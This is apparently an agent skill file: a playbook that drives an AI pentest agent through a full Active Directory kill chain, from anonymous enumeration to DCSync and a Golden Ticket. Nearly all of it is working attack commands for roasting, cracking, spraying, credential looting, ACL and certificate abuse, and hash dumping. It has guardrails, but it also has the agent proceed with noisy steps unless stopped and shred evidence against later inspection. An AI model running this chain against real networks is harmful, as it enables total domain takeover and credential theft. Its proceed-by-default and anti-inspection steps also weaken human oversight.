---
name: AD Kill Chain
description: Walk an Active Directory domain from zero-credential LAN access to DCSync / Golden Ticket using BloodHound-driven path selection.
---

# Active Directory Kill Chain

## Mission
From no credentials on the internal network, reach **`krbtgt` NTLM hash extraction** via `DCSync`, optionally followed by **Golden Ticket** forgery for persistent DA-equivalent access.

Success = you possess `krbtgt`'s NT hash and have demonstrated a valid forged-ticket authentication to a DC.

## Preconditions (abort if not met)

Before any AD-specific step, confirm LAN reach with:
```
query_graph: "Return IPs where a port in (88, 135, 389, 445, 464, 636, 3268, 3269) is open,
              plus any associated service banner or OS fingerprint. Prefer Windows hosts."
```
- Zero results → **abort**. You need a foothold first (external→internal pivot chain, or an operator-supplied `chisel` tunnel).
- At least one Windows host with 445 or 88 → continue. Pick one DC candidate, call it `$DC_IP`, remember its domain `$DOMAIN`.

## Tool palette — which RedAmon tool for which job

| Task                           | RedAmon tool          | Notes |
|--------------------------------|-----------------------|-------|
| Any AD command                 | `kali_shell`          | impacket-*, certipy-ad, nxc, bloodhound-python, john, hashcat, kerbrute, gMSADumper, bloodyAD, gpp-decrypt all pre-installed |
| Graph path-finding             | `kali_shell bhgraph …`| NetworkX over BloodHound JSON; state in `/tmp/adkc/bhgraph.pkl` |
| Existing recon (open ports, OS)| `query_graph`         | The recon graph already knows which hosts are Windows |
| Multi-line Python helpers      | `execute_code`        | Use when shell-escaping gets ugly |
| Lateral-movement shells        | `kali_shell impacket-psexec` | **Never** use `metasploit_console` for PsExec — msf is a singleton and serialises all waves; impacket parallelises |

Working directory for this skill's artefacts: **`/tmp/adkc/`** (always `mkdir -p` first).

## Phase-by-phase playbook

### Phase 0 — Confirm foothold & pick DC
```
query_graph: "List Windows IPs with port 445 or 88 open; include any domain info from SMB banners"
```
Store: `DC_IP`, `DOMAIN` (e.g. `CORP.LOCAL`).

### Phase 1 — Anonymous enumeration (no creds)
```
kali_shell: mkdir -p /tmp/adkc && cd /tmp/adkc
kali_shell: enum4linux-ng -A -oJ /tmp/adkc/e4l $DC_IP
kali_shell: nxc smb $DC_IP -u '' -p '' --shares --users --groups
kali_shell: nxc ldap $DC_IP -u '' -p '' --users
kali_shell: nxc smb $DC_IP -u guest -p '' --pass-pol
```
**Extract and save:**
- `DOMAIN_SID` from enum4linux-ng JSON (for later Golden Ticket)
- `LOCKOUT_THRESHOLD` from `--pass-pol` (**critical** — governs Phase 5 safety math)
- Users → `/tmp/adkc/users.txt` (one username per line, no `DOMAIN\` prefix)

If SMB/LDAP anonymous is denied, fall back to pre-auth-timing enum:
```
kali_shell: kerbrute userenum --dc $DC_IP -d $DOMAIN \
            /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o /tmp/adkc/users.txt
```

**Always remove `krbtgt` and `Administrator`** from `users.txt` before any spray step (case-insensitive):
```
kali_shell: sed -i -E '/^(krbtgt|administrator)$/Id' /tmp/adkc/users.txt
```

### Phase 2 — ASREPRoast (no credentials required)
```
kali_shell: impacket-GetNPUsers -dc-ip $DC_IP -usersfile /tmp/adkc/users.txt \
            -no-pass -format hashcat -outputfile /tmp/adkc/asrep.hash "$DOMAIN/"
```
If `/tmp/adkc/asrep.hash` is non-empty → jump to Phase 4 to crack it.

### Phase 3 — Kerberoast (requires any one domain cred)
Only after Phase 5 has produced a credential. Do not attempt before.
```
kali_shell: impacket-GetUserSPNs -dc-ip $DC_IP -request \
            -outputfile /tmp/adkc/kerberoast.hash "$DOMAIN/$USER:$PASS"
```

### Phase 4 — Offline crack
Build a target-specific wordlist (always worth the 30 seconds if a public site exists):
```
kali_shell: cewl -d 2 -w /tmp/adkc/company.txt https://$PUBLIC_SITE || true
```
Crack in tiers (fast to broad):
```
# AS-REP — hashcat mode 18200
kali_shell: hashcat -m 18200 /tmp/adkc/asrep.hash \
            /tmp/adkc/company.txt /usr/share/wordlists/rockyou.txt \
            -r /usr/share/hashcat/rules/best64.rule --force --potfile-path /tmp/adkc/hc.pot

# Kerberoast — hashcat mode 13100
kali_shell: hashcat -m 13100 /tmp/adkc/kerberoast.hash \
            /tmp/adkc/company.txt /usr/share/wordlists/rockyou.txt \
            -r /usr/share/hashcat/rules/best64.rule --force --potfile-path /tmp/adkc/hc.pot

# Show what cracked
kali_shell: hashcat -m 18200 /tmp/adkc/asrep.hash  --show --potfile-path /tmp/adkc/hc.pot
kali_shell: hashcat -m 13100 /tmp/adkc/kerberoast.hash --show --potfile-path /tmp/adkc/hc.pot
```
For each `user:password` cracked, append to `/tmp/adkc/creds.txt` and immediately mark owned in bhgraph (Phase 6).

### Phase 5 — Credentialed enumeration + password spray

**MANDATORY safety check first.** Read the policy with *any* valid cred, compute spray ceiling:
```
kali_shell: nxc smb $DC_IP -u $USER -p $PASS --pass-pol
```
Rule: `max_sprays_per_user_per_30min = LOCKOUT_THRESHOLD - 2`. If `LOCKOUT_THRESHOLD <= 2`, **do not spray** — only try cracked credentials directly against specific users.

Spray each candidate separately:
```
kali_shell: nxc smb $DC_IP -u /tmp/adkc/users.txt -p "$CANDIDATE" \
            --continue-on-success --no-bruteforce
```
Between distinct passwords, wait 30+ minutes:
```
kali_shell: sleep 1800
```
On any `(Pwn3d!)` tag → that user is local admin on that host → record as a Phase 8 target.

**Loot SYSVOL for GPP cpassword:**
```
kali_shell: smbclient //$DC_IP/SYSVOL -U "$DOMAIN/$USER%$PASS" \
            -c 'prompt OFF; recurse ON; tarmode full; tar c /tmp/adkc/sysvol.tar *'
kali_shell: mkdir -p /tmp/adkc/sysvol && tar -xf /tmp/adkc/sysvol.tar -C /tmp/adkc/sysvol
kali_shell: grep -rIl cpassword /tmp/adkc/sysvol/ | xargs -r grep -hoE 'cpassword="[^"]*"' | sort -u > /tmp/adkc/cpass.txt
# Decrypt each found blob (strip both prefix and trailing quote):
kali_shell: while IFS= read -r line; do \
              v="${line#cpassword=\"}"; v="${v%\"}"; \
              [ -n "$v" ] && gpp-decrypt "$v" 2>/dev/null; \
            done < /tmp/adkc/cpass.txt
```

**Spider all readable shares:**
```
kali_shell: nxc smb $DC_IP -u $USER -p $PASS --spider-plus \
            --regex 'password|passwd|secret|api[_-]?key|cpassword|token|connectionstring'
```

### Phase 6 — BloodHound + NetworkX (no Neo4j)

Collect (any valid cred works):
```
kali_shell: mkdir -p /tmp/adkc/bh && cd /tmp/adkc/bh && \
            bloodhound-python -c All,LoggedOn -d $DOMAIN \
                -u $USER -p $PASS -ns $DC_IP --zip -op bh
```
Build the in-memory graph:
```
kali_shell: bhgraph load /tmp/adkc/bh/*.zip
kali_shell: bhgraph stats
```
Mark every cred you control as `owned`:
```
kali_shell: bhgraph own "$USER@$DOMAIN" "$SECOND_USER@$DOMAIN" …
```
Ask for the path:
```
kali_shell: bhgraph path-to-da
```

**Other reconnaissance queries:**
```
kali_shell: bhgraph kerberoastable     # refresh Phase 3 targets
kali_shell: bhgraph asreproastable     # refresh Phase 2 targets
kali_shell: bhgraph unconstrained      # unconstrained delegation abuse candidates
kali_shell: bhgraph dcsyncers          # who already has DCSync rights
kali_shell: bhgraph high-value         # BloodHound's auto-marked high-value nodes
kali_shell: bhgraph lookup "USER@$DOMAIN"   # inspect one principal's edges
```

**Walk the path edge-by-edge.** Map each edge type returned by `path-to-da` to a concrete abuse:

| BloodHound edge                       | Command to walk it |
|---------------------------------------|--------------------|
| `MemberOf`                            | Passive — inherited; no action |
| `GenericAll` on user / `ForceChangePassword` | `kali_shell: bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC_IP set password "$TARGET" 'NewP@ssw0rd!'` |
| `GenericAll` / `AddMember` on group    | `kali_shell: bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC_IP add groupMember "$GROUP" "$SELF"` |
| `WriteDACL` / `WriteOwner`             | `kali_shell: impacket-dacledit -action write -rights FullControl -principal $SELF -target $TARGET "$DOMAIN/$USER:$PASS@$DC_IP"` — then re-run the GenericAll row above |
| `ReadGMSAPassword`                     | `kali_shell: gMSADumper.py -u $USER -p $PASS -d $DOMAIN -l $DC_IP` |
| `AllowedToDelegate` (constrained)      | `kali_shell: impacket-getST -spn $SPN -impersonate Administrator "$DOMAIN/$USER:$PASS"` |
| `AllowedToAct` (RBCD)                  | Add attacker-controlled computer via `impacket-addcomputer`, then `impacket-rbcd`, then `impacket-getST -impersonate Administrator "$DOMAIN/$USER:$PASS@$DC_IP"` |
| `AdminTo` on computer                  | `kali_shell: impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET_IP"` |
| `HasSession` on computer (user you want to become is logged on) | Get local admin on that computer → `impacket-secretsdump` extracts cached credentials / LSA secrets |
| `GetChanges` + `GetChangesAll` (DCSync)| Phase 9 |

After each successful edge-walk, immediately:
1. Append any new credential/hash to `/tmp/adkc/creds.txt`.
2. `bhgraph own <new_principal>` to update the graph's `owned` set.
3. **Re-run `bhgraph path-to-da`** — the new cred may have shortened the path dramatically.

### Phase 7 — AD-CS ESC sweep (parallel shortcut to DA)

Run this as soon as you have any cred; it often skips half the chain:
```
kali_shell: certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
            -vulnerable -stdout -output /tmp/adkc/certipy
```
If any template is flagged **ESC1, ESC2, ESC3, ESC4, or ESC8**:

```
kali_shell: certipy-ad req -u $USER@$DOMAIN -p $PASS \
            -ca "$CA_NAME" -template "$VULN_TEMPLATE" \
            -upn "administrator@$DOMAIN" -out /tmp/adkc/admin
kali_shell: certipy-ad auth -pfx /tmp/adkc/admin.pfx -dc-ip $DC_IP
```
Output contains `Administrator`'s NT hash → pass-the-hash to any DC → Phase 9.

### Phase 8 — Local admin → lateral movement → hash harvest
On any host where you're local admin (from Phase 5 `(Pwn3d!)` or BloodHound `AdminTo`):
```
kali_shell: impacket-secretsdump "$DOMAIN/$USER:$PASS@$TARGET_IP"
```
Save every new NT hash to `/tmp/adkc/creds.txt`. Pass-the-hash sweep:
```
kali_shell: nxc smb $INTERNAL_CIDR -u Administrator -H $LOCAL_NT_HASH \
            --local-auth --continue-on-success
```
Every `(Pwn3d!)` host → new `impacket-secretsdump` target → more creds → back to Phase 6 `bhgraph own`.

### Phase 9 — DCSync (the finish line)
When an owned principal has `GetChanges` + `GetChangesAll` (verify with `bhgraph dcsyncers`):
```
kali_shell: impacket-secretsdump -just-dc-ntlm \
            "$DOMAIN/$PRIV_USER:$PRIV_PASS@$DC_IP" \
            -outputfile /tmp/adkc/ntds
```
`krbtgt` line in `/tmp/adkc/ntds.ntds` → save it to `/tmp/adkc/krbtgt.hash`.

### Phase 10 — Golden Ticket (optional persistence, operator must approve)
`impacket-ticketer` writes `Administrator.ccache` to CWD, so anchor both calls:
```
kali_shell: cd /tmp/adkc && impacket-ticketer -nthash $KRBTGT_NT_HASH \
            -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
kali_shell: KRB5CCNAME=/tmp/adkc/Administrator.ccache impacket-psexec -k -no-pass $DC_IP
```
Successful SYSTEM shell on the DC via the forged ticket = proof of total compromise.

## The self-reinforcing loop (THE key idea)

Every credential obtained — from cracking, spraying, looting, secretsdump, certipy, gMSADumper — must trigger:
1. Append to `/tmp/adkc/creds.txt`.
2. `bhgraph own <new_principal>`.
3. `bhgraph path-to-da` (path may now be shorter).
4. Append any new discovered usernames to `/tmp/adkc/users.txt` (future spray targets).

Exit the loop when **any** owned principal reaches DCSync → go to Phase 9.

## Safety guardrails (NON-NEGOTIABLE)

1. **Pass-pol check is mandatory before any spray.** If you skip it, you will lock the entire domain and get the engagement terminated.
2. **`krbtgt` and `Administrator` are never spray targets.** Remove them from `users.txt` immediately after Phase 1.
3. **Minimum 30-minute gap** between distinct spray passwords (observation window resets).
4. **Halt on 2+ lockouts during a spray.** Report to the operator and wait for guidance before continuing.
5. **Emit an operator-visible chat message** naming the event ID before running:
   - Phase 2 ASREPRoast (Windows Event 4768 generated on DC)
   - Phase 3 Kerberoast (Event 4769)
   - Phase 9 DCSync (Event 4662 — very loud; most EDRs trip on this)
   - Phase 10 Golden Ticket (persistence is a different authorisation scope — wait for explicit operator go-ahead)

   There is no dedicated notify tool; simply write a plain user-facing sentence such as *"About to run Kerberoast against $DC_IP — this generates Event 4769 and may trip EDR. Proceeding unless you say stop."* The operator can then interrupt via the chat UI.
6. **Artefacts stay in `/tmp/adkc/` only.** Never write credentials to the agent's conversational output unless the operator explicitly asks.

## Halt conditions

- DCSync achieved → Phase 9 complete → report krbtgt hash to operator → **skill complete**.
- After 3 full iterations of the self-reinforcing loop with no new owned principals and no path to DA → hand off to **AD-CS ESC chain** (if templates exist) or **lateral-movement chain** (broaden foothold).
- Operator denies approval for a noisy phase → respect, continue with the quietest alternatives still open.

## Reporting (on skill completion)

Emit to the operator:
- Every credential obtained, with its source: `ASREPRoast | Kerberoast | GPP | Spray | secretsdump | certipy | gMSADumper`.
- The BloodHound path(s) walked (copy `bhgraph path-to-da` output).
- Evidence location for `krbtgt.hash`.
- **MITRE ATT&CK IDs touched:** T1087.002, T1558.003, T1558.004, T1110.003, T1003.006, T1550.002, T1649, T1136.002.
- **Remediation bullets:** deploy LAPS, disable NTLM where possible, tier-0 separation, audit AD-CS templates (remove `ENROLLEE_SUPPLIES_SUBJECT` on client-auth templates), rotate `krbtgt` twice, enable pre-authentication on every enabled user account, enforce service-account password length ≥ 25 chars.

## Cleanup (end-of-engagement OPSEC)

When the operator confirms the engagement is done, purge the working tree:
```
kali_shell: shred -u /tmp/adkc/*.hash /tmp/adkc/*.ccache /tmp/adkc/ntds.ntds 2>/dev/null; \
            rm -rf /tmp/adkc
```
Container restarts already wipe `/tmp`, but explicit shredding of credential files mid-engagement limits exposure if the sandbox is ever inspected.

## Artefact layout (so follow-up skills know where to look)

```
/tmp/adkc/
├── e4l                       # enum4linux-ng JSON
├── users.txt                 # spray target list (Administrator/krbtgt removed)
├── company.txt               # cewl-derived wordlist
├── asrep.hash                # Phase 2 output
├── kerberoast.hash           # Phase 3 output
├── hc.pot                    # hashcat potfile
├── creds.txt                 # cumulative user:password | user:hash store
├── sysvol/                   # looted SYSVOL
├── cpass.txt                 # raw GPP cpassword blobs
├── bh/*.zip                  # BloodHound collector output
├── bhgraph.json              # NetworkX state (managed by bhgraph)
├── certipy/                  # AD-CS ESC output
├── ntds.ntds                 # Phase 9 DCSync dump
└── krbtgt.hash               # THE FINISH LINE
```
